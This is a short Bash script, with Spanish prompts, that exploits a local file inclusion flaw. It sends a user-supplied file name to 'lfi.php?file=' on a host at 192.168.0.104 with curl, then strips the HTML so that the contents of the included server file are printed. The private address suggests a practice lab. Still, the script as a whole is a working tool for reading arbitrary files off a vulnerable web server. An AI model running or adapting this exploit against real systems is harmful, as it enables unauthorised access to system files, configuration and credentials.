#!/bin/bash

function ctrl_c(){
	echo -e "\n [!] Saliendo ..."
	exit 1
}

trap ctrl_c INT

function helpPanel(){
	echo -e "\n[+] Uso:\n"
	echo -e "\t[-f] filename"
	echo -e "\t[-h] Show help panel"
	exit 1
}

function exploit_lfi(){
	echo $filename
	curl -s -X  GET "http://192.168.0.104/lfi.php?file=$filename" | grep "col-8" -A 100 | grep "main" -B 100 | grep -v -E "main|<div|</div" | sed "s/^ *//"
}


parameter_counter=0
while getopts ":f:h:" args; do
	case $args in
		f) filename=$OPTARG && parameter_counter+=1;;
		h) helpPanel;;
	esac
done

if [ $parameter_counter -ne 1 ]; then
	helpPanel
else
	exploit_lfi

fi

